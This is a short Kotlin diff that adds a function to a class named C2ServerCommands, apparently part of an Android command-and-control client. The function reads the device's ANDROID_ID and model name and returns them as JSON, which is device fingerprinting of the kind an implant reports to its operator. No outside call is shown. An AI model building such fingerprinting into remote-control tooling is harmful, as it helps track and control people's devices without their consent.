@@ -22,6 +22,21 @@ import java.util.concurrent.TimeUnit
 
 class C2ServerCommands(private val context: Context) {
 
+    @SuppressLint("HardwareIds")
+    fun getSysInfo(): String {
+        val deviceName = getDeviceName()
+        var ssaid = "UNKNOWN_ID"
+        try {
+            ssaid = Settings.Secure.getString(context.contentResolver, Settings.Secure.ANDROID_ID) ?: "UNKNOWN_ID"
+        } catch (e: Exception) {
+            // Ignore if we can't get it
+        }
+
+        // Return as JSON
+        val escapedName = deviceName.replace("\"", "\\\"").replace("\n", " ")
+        return "{\"android_id\": \"$ssaid\", \"device_name\": \"$escapedName\"}"
+    }
+
     fun getDeviceName(): String {
         val manufacturer = Build.MANUFACTURER
         val model = Build.MODEL
